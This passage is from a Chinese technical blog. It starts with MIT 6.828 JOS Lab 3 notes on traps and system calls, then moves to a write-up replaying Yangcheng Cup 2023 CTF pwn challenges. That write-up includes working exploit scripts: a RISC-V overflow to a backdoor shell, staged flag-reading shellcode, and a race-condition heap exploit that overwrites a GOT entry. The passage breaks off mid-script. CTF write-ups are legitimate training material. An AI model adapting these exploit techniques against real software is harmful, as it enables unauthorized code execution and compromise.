class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">/* TRAPHANDLER defines a globally-visible function for handling a trap.</span><br><span class="line"> * It pushes a trap number onto the stack, then jumps to _alltraps.</span><br><span class="line"> * Use TRAPHANDLER for traps where the CPU automatically pushes an error code.</span><br><span class="line"> *</span><br><span class="line"> * You shouldn't call a TRAPHANDLER function from C, but you may</span><br><span class="line"> * need to _declare_ one in C (for instance, to get a function pointer</span><br><span class="line"> * during IDT setup).  You can declare the function with</span><br><span class="line"> *   void NAME();</span><br><span class="line"> * where NAME is the argument passed to TRAPHANDLER.</span><br><span class="line"> */</span><br><span class="line">#define TRAPHANDLER(name, num)\</span><br><span class="line">.globl name;/* define global symbol for 'name' */\</span><br><span class="line">.type name, @function;/* symbol type is function */\</span><br><span class="line">.align 2;/* align function definition */\</span><br><span class="line">name:/* function starts here */\</span><br><span class="line">pushl $(num);\</span><br><span class="line">jmp _alltraps</span><br><span class="line"></span><br><span class="line">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn't push an error code.</span><br><span class="line"> * It pushes a 0 in place of the error code, so the trap frame has the same</span><br><span class="line"> * format in either case.</span><br><span class="line"> */</span><br><span class="line">#define TRAPHANDLER_NOEC(name, num)\</span><br><span class="line">.globl name;\</span><br><span class="line">.type name, @function;\</span><br><span class="line">.align 2;\</span><br><span class="line">name:\</span><br><span class="line">pushl $0;\</span><br><span class="line">pushl $(num);\</span><br><span class="line">jmp _alltraps</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(divide_handler, T_DIVIDE);</span><br><span class="line">//......</span><br><span class="line">//其他中断定义方式相同,这里省略了</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Lab 3: Your code here for _alltraps</span><br><span class="line"> */</span><br><span class="line">.global _alltraps</span><br><span class="line">_alltraps:</span><br><span class="line">pushl %ds;</span><br><span class="line">pushl %es;</span><br><span class="line">pushal;</span><br><span class="line"></span><br><span class="line">movw $GD_KD,%ax;</span><br><span class="line">movw %ds,%ax;</span><br><span class="line">movw %es,%ax;</span><br><span class="line"></span><br><span class="line">pushl %esp;</span><br><span class="line">call trap;</span><br></pre></td></tr></tbody></table></figure><p>下面是Trapframe结构的定义,由注释分为三个部分,<br>最下面的一部分仅在发生特权级切换的时候才压入.<br>下图中的Trapframe部分在发生异常时由处理器硬件压入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310030006345.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> {</span></span><br><span class="line"><span class="comment">/* registers as pushed by pusha */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_edi;</span><br><span class="line"><span class="type">uint32_t</span> reg_esi;</span><br><span class="line"><span class="type">uint32_t</span> reg_ebp;</span><br><span class="line"><span class="type">uint32_t</span> reg_oesp;<span class="comment">/* Useless */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_ebx;</span><br><span class="line"><span class="type">uint32_t</span> reg_edx;</span><br><span class="line"><span class="type">uint32_t</span> reg_ecx;</span><br><span class="line"><span class="type">uint32_t</span> reg_eax;</span><br><span class="line">} __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line"><span class="type">uint16_t</span> tf_es;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding1;</span><br><span class="line"><span class="type">uint16_t</span> tf_ds;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding2;</span><br><span class="line"><span class="type">uint32_t</span> tf_trapno;</span><br><span class="line"><span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line"><span class="type">uint32_t</span> tf_err;</span><br><span class="line"><span class="type">uintptr_t</span> tf_eip;</span><br><span class="line"><span class="type">uint16_t</span> tf_cs;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding3;</span><br><span class="line"><span class="type">uint32_t</span> tf_eflags;</span><br><span class="line"><span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line"><span class="type">uintptr_t</span> tf_esp;</span><br><span class="line"><span class="type">uint16_t</span> tf_ss;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding4;</span><br><span class="line">} __attribute__((packed));</span><br></pre></td></tr></tbody></table></figure><h5 id="trap流程分析"><a href="#trap流程分析" class="headerlink" title="trap流程分析"></a>trap流程分析</h5><p>i386_init中调用trap_init完成trap的初始化:将各中断处理例程(在本实现中是中断处理例程的入口点)挂接到IDT中,设置TSS段(存储了内核栈的地址信息)并挂接到GDT中,设置IDT和TSS.</p><p>当中断或异常发生,处理器根据中断向量号在IDT中寻找对应的中断处理例程,在进行特权级检查(中断处理例程DPL≤CPL≤中断门描述符DPL)后,若发生特权级转换,CPU从当前TSS段中取出内核栈的地址信息(ss,esp)并加载到ss,esp寄存器中(加载前临时保存原值).在内核栈中压入原栈地址,再压入CS和eip,跳转到中断处理例程.接下来由操作系统(而不是处理器)压入错误码(是否压入因异常而异)及其他寄存器信息,形成Trapframe结构.跳转到trap函数.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// The environment may have set DF and some versions</span></span><br><span class="line"><span class="comment">// of GCC rely on DF being clear</span></span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">"cld"</span> ::: <span class="string">"cc"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that interrupts are disabled.  If this assertion</span></span><br><span class="line"><span class="comment">// fails, DO NOT be tempted to fix it by inserting a "cli" in</span></span><br><span class="line"><span class="comment">// the interrupt path.</span></span><br><span class="line">assert(!(read_eflags() &amp; FL_IF));</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"Incoming TRAP frame at %p\n"</span>, tf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">3</span>) {</span><br><span class="line"><span class="comment">// Trapped from user mode.</span></span><br><span class="line">assert(curenv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy trap frame (which is currently on the stack)</span></span><br><span class="line"><span class="comment">// into 'curenv-&gt;env_tf', so that running the environment</span></span><br><span class="line"><span class="comment">// will restart at the trap point.</span></span><br><span class="line">curenv-&gt;env_tf = *tf;</span><br><span class="line"><span class="comment">// The trapframe on the stack should be ignored from here on.</span></span><br><span class="line">tf = &amp;curenv-&gt;env_tf;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Record that tf is the last real trapframe so</span></span><br><span class="line"><span class="comment">// print_trapframe can print some additional information.</span></span><br><span class="line">last_tf = tf;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dispatch based on what type of trap occurred</span></span><br><span class="line">trap_dispatch(tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return to the current environment, which should be running.</span></span><br><span class="line">assert(curenv &amp;&amp; curenv-&gt;env_status == ENV_RUNNING);</span><br><span class="line">env_run(curenv);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>trap函数进一步根据中断向量号分发(trap_dispatch)到各真正的中断处理例程(本实现中IDT中保存的只是一个中断处理例程的entry).<br>完成异常处理后,调用env_run函数恢复原环境(进程).</p><h3 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls"><a href="#Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls" class="headerlink" title="Part B: Page Faults, Breakpoints Exceptions, and System Calls"></a>Part B: Page Faults, Breakpoints Exceptions, and System Calls</h3><h4 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h4><p>调试器执行的原理:临时替换断点处的1字节指令为int 3系统调用触发The Breakpoint Exception.在这里的实现中会调用内核监视器monitor,添加两个命令nextstep和continue,前者会修改eflags的FL_TF位使处理器开始单步执行,每次执行完成发出一个中断号为1的debug exception,在本实现中该异常处理例程同样会启动monitor.</p><blockquote><p>The breakpoint exception, interrupt vector 3 (T_BRKPT), is normally used to allow debuggers to insert breakpoints in a program’s code by temporarily replacing the relevant program instruction with the special 1-byte int3 software interrupt instruction.</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_nextstep</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(!tf)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"empty Trapframe"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"$rip: %p\n"</span>,tf-&gt;tf_eip);</span><br><span class="line"><span class="keyword">switch</span>(tf-&gt;tf_trapno)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">case</span> T_BRKPT:</span><br><span class="line">tf-&gt;tf_eflags |= FL_TF;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> T_DEBUG:</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_eflags &amp; FL_TF)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">cprintf(<span class="string">"nextstep(ni) can only called via int 3(breakpoint exception)\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_continue</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(!tf)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"empty Trapframe"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(tf-&gt;tf_trapno==T_DEBUG||tf-&gt;tf_trapno==T_BRKPT)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_eflags &amp; FL_TF) </span><br><span class="line">{</span><br><span class="line">            tf-&gt;tf_eflags &amp;= ~FL_TF;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"continue can only called via breakpoint or debug exception!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="System-calls-系统调用"><a href="#System-calls-系统调用" class="headerlink" title="System calls 系统调用"></a>System calls 系统调用</h4><p>注意权限位的检验采用(perm&amp;(*pte))==perm的形式,想象一下交集便于理解这一操作.(一些类型转换使程序看起来很乱,ye..i know…)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">user_mem_check</span><span class="params">(<span class="keyword">struct</span> Env *env, <span class="type">const</span> <span class="type">void</span> *va, <span class="type">size_t</span> len, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="type">uintptr_t</span> start_va = ROUNDDOWN((<span class="type">uintptr_t</span>)va,PGSIZE);</span><br><span class="line"><span class="type">uintptr_t</span> end_va = ROUNDUP((<span class="type">uintptr_t</span>)(va+len),PGSIZE);</span><br><span class="line"><span class="type">pte_t</span>* pte;</span><br><span class="line"><span class="keyword">for</span>(;start_va&lt;end_va;start_va+=PGSIZE)</span><br><span class="line">{</span><br><span class="line">pte = pgdir_walk(env-&gt;env_pgdir,(<span class="type">void</span>*)start_va,<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span>(start_va&gt;=ULIM||pte==<span class="literal">NULL</span>||!(*pte&amp;PTE_P)||((perm&amp;(*pte))!=perm))</span><br><span class="line">{</span><br><span class="line">user_mem_check_addr = start_va&gt;(<span class="type">uintptr_t</span>)va?start_va:(<span class="type">uintptr_t</span>)va;</span><br><span class="line"><span class="keyword">return</span> -E_FAULT;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="syscall流程分析"><a href="#syscall流程分析" class="headerlink" title="syscall流程分析"></a>syscall流程分析</h5><p>用户进程调用sys_xxx函数(其实用户并不直接调用这样的函数,而是由更上一层的函数如cprintf之类的调用.<del>这里的用户指的是使用JOS而不是开发JOS的开发者hh</del>),向操作系统申请xxx的操作,sys_xxx函数调用syscall函数,syscall函数使用int 0x30触发中断.<br>(上述sys_xxx,syscall函数均为lib/syscall.c中定义的由用户进程使用的函数,而非kern/syscall.c中的内核使用的实现)</p><p>中断处理过程参考上面的trap流程分析.<br>最终被分发到内核的syscall函数,该函数通过调用相应的内核函数完成功能,并设置系统调用返回值,之后正常从中断返回到用户进程.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2023 复现</title>
      <link href="/2023/ycb2023/"/>
      <url>/2023/ycb2023/</url>
      
        <content type="html"><![CDATA[<p>heap没出没进线下…</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>qemu-riscv64 -g 2333 ./pwn<br>gdbinit这样设置方便调试,然后gdb-multiarch -x gdbinit就能调了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set arch riscv:rv64</span><br><span class="line">target remote 127.0.0.1:2333</span><br><span class="line">define hook-stop</span><br><span class="line">    info reg</span><br><span class="line">    echo "\n\n\n\n\n"</span><br><span class="line">    x/10i $pc</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b *0x123457EA</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281240372.png"></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>main函数,一次向unk_12347078读入8字节,一次向栈上读入最多0x120字节,没有溢出.之后跳转到sub_12345786函数,即vuln.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281230369.png"><br>vuln函数:<br>调用strlen函数检查之前在main函数中第二次输入的数据长度是否小于8,这里有个andi a4,a5,0xFF的操作,即只取了strlen结果的低8位,则0x108被转换成0x8,完成绕过.而返回地址恰好存储在strcpy(dest,source)的dest+0x100的地方,正好可以覆盖.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281229972.png"><br>还有个后门函数不过有过滤,可以直接跳到这个位置绕过过滤.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281239787.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x100</span></span><br><span class="line">backdoor = <span class="number">0x12345770</span></span><br><span class="line">payload = <span class="string">b"a"</span>*offset + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'name:'</span>, <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">io.sendafter(<span class="string">b'words'</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>有个offbynull,第17个字节没有限制可以输入ret的字节码.<br>第一次输入时输入syscall的字节码,第二次输入shellcode利用栈上数据布置read的参数.第三次正式读入orw的shellcode,dup2改一下fd.<br>偷搬wp.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b'[2] Input: (ye / no)\n'</span>, <span class="string">b'\x0f\x05'</span>) <span class="comment"># syscall</span></span><br><span class="line">sc = <span class="string">'''</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push rbx </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">shellcode= asm(sc)</span><br><span class="line">sa(<span class="string">b'======== Input Your P0P Code ========'</span>, shellcode)</span><br><span class="line">sc = <span class="string">'''</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x200000000</span></span><br><span class="line"><span class="string">mov rax, 0x21</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 2</span></span><br><span class="line"><span class="string">mov rax, 0x21</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,2</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 90</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0x200000000</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload = (<span class="number">0x48</span> + <span class="number">2</span>) * <span class="string">b'a'</span> + asm(sc)</span><br><span class="line">s(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>大概逻辑是主函数读取输入,根据输入开启单独线程进行相应的堆操作.<br>注意下输入的格式.</p><p>看了很久没找到洞.由于处理输入是在单独的线程中,考虑过条件竞争,但否定了,当时的理由是:<br>    “开启一个线程1后,线程1开始简单逻辑,主线程回到fgets阻塞等待IO,待结束阻塞后才开启线程2,由于IO操作,程序正常运行情况下线程2一定是在线程1完成逻辑并结束后再开启的,不会存在竞争现象.”</p><p>看了其他师傅的wp才发现edit函数中有个sleep(1)….ok那就竞争吧.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291610316.png"><br>相关调试命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = '''</span><br><span class="line">set scheduler-locking on</span><br><span class="line">breakrva 0x1955</span><br><span class="line">c</span><br><span class="line">breakrva 0x14f8</span><br><span class="line">c</span><br><span class="line">'''</span><br></pre></td></tr></tbody></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>既然edit会sleep(1),那就在edit等待的时候替换掉全局变量里的堆块指针,指向一个更小的chunk,在本题中便可制造一个0x18字节的堆溢出.glibc2.35的0x18字节堆溢出,想想都麻烦,不过好在这题的特殊结构,可以覆盖content_ptr制造一个任意地址读写.<br>好在main函数能正常退出,可以直接改返回地址了.<br>发现libc只是partial relro,可以改下got表,我exp是直接改onegadget了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291616663.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309301605803.png"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>具体有点麻烦的,多调调吧,主要就是memncpy会用\0填满n字节,然后我们又要用一次部分覆写…<br>这libc的environ末尾还是00…<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291936629.png"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content:<span class="built_in">bytes</span></span>):</span><br><span class="line">    payload = <span class="string">b'1 '</span></span><br><span class="line">    payload += content</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    payload = <span class="string">b'2 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    payload = <span class="string">b'3 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()+<span class="string">b':'</span>+content</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    payload = <span class="string">b'4 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    payload = <span class="string">b'5 '</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    payload = <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x62</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b'a'</span>*<span class="number">0x60</span>+<span class="string">b'\xa0\x08'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b'b'</span>*<span class="number">0x58</span>)<span 